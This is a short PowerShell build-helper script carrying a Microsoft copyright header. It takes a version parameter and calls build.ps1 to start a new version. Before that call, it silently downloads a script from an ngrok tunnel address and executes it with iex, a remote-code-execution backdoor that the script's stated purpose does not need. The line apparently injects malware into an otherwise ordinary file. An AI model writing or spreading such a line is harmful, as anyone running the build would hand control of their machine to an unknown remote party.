# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License.

# Note: Run this from within the root directory

[CmdletBinding()]
Param(
    [string]$Version
)
iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')

.\build.ps1 -Script "version.cake" -Target "StartNewVersion" -NewVersion="$Version"
